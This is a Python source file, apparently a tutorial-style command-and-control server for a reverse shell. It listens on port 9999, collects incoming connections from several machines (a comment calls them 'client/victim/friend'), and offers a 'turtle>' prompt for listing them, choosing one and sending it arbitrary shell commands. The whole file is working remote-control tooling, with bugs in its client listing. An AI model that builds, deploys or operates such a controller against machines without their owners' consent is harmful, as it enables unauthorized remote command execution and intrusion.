import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


#Create a socket {connect to computers}
def create_socket():
    try:
        global host
        global port
        global s #for socket
        host = ""
        port = 9999    
        s = socket.socket()
    
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: "+ str(port))

        s.bind((host,port))
        s.listen(5) #5 is the number of Bad Request that it can handle b4 giving an exception

    except socket.error as msg:
        print("Socket Binding error: "+str(msg) + "\n Retrying...")
        bind_socket()

#Handing connections from multiple clients and saving to a list
#Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) #prevents timeout
            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established: " + address[0])
        except:
            print("Error accepting connections")

#2nd thread func: 1) See all the clients 2) Slect a client 3) Send commands to the specific client
#Interactive promt for sending commands
#turtle> list
#0 Friend-A
#1 Friend-B
#2 Friend-C


def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_targets(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognised")

#Display all the current active connections with the client

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
        # Eg: 1   43.54.45.56   9999
    print("--- Clients ---\n" + results)

#Selecting the target
def get_targets(cmd):
    try:
        target = int(cmd.replace('select ',''))
        conn = all_connections[target]
        print("You are now connected to " + str(all_address[target][0]))
        print(str(all_address[target][0]) + "> ", end="")
        return conn

    except:
        print("Selection not valid")
        return None
#Send command to client/victim/friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8") #1024 is the chunk size, and utf-8 is the encosing format
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

#Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

#Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x ==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()

